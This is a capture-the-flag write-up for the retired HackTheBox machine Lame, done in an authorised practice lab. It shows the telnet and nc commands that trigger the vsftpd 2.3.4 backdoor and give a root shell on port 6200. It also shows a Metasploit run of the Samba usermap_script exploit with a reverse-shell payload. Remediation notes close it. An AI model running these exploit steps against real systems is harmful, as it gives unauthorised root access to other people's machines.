HTB Lame: vsftpd backdoor and Samba usermap_script to root

retired-machineeasy

Lame is a retired HackTheBox easy Linux machine and the traditional first root. Synopsis: several old, intentionally vulnerable services side by side — FTP (vsftpd 2.3.4), SSH, and Samba 3.0.20. Two independent roads to root on one box.

$ Enumeration — Nmap

# nmap: services and versions
nmap -sC -sV -oN lame.nmap 10.10.10.3

FTP reports vsftpd 2.3.4, SMB reports Samba 3.0.20. Both version strings map to famous public exploits — one search each turns versions into working roads.

$ Road one — vsftpd 2.3.4 backdoor

# bash: trigger backdoor, catch shell
telnet 10.10.10.3 21
USER backdoored:)
PASS anything
nc 10.10.10.3 6200
id
uid=0(root) gid=0(root)

Logging in with a username ending in :) opens a shell on port 6200 as root immediately. Fastest root on the box.

$ Road two — Samba usermap_script (CVE-2007-2447)

# msfconsole: unauthenticated Samba RCE
msfconsole -q
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 10.10.10.3
msf6 exploit(usermap_script) > set PAYLOAD cmd/unix/reverse
msf6 exploit(usermap_script) > set LHOST 10.10.14.23
msf6 exploit(usermap_script) > run

Samba 3.0.20 maps usernames through a script without authentication — root shell with no credentials at all. Unauthenticated RCE in file-sharing is a pattern that still shows up in real networks.

$ Flags

user.txt on a low-privilege home directory, root.txt in /root — both readable from either root shell. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Brute-forcing SSH first (read service versions, do not guess passwords) and overcomplicating Samba with valid credentials (the exploit needs none — that is the whole point).

$ Remediation notes

Retire vsftpd 2.3.4 and Samba 3.x entirely, patch or replace legacy file services, and alert on shell listeners appearing on unexpected high ports like 6200. Written by Lucky Thandel.
